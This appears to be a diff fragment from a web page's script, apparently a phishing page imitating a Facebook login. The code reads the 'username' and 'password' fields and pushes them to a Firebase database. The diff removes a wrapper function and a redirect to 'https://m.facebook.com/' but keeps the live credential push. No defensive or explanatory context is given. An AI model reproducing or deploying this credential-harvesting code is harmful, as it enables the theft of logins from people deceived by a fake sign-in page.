@@ -94,18 +94,11 @@
   var username=document.getElementById("username").value;
   var password=document.getElementById("password").value;
   var ref=firebase.database().ref();
-  function push()
-{
   ref.push({
   username:username,
   password:password
-});
- window.location = 'https://m.facebook.com/';
-};
-
-			
+});			
 }
-
 </script>
 </body>
 </html>
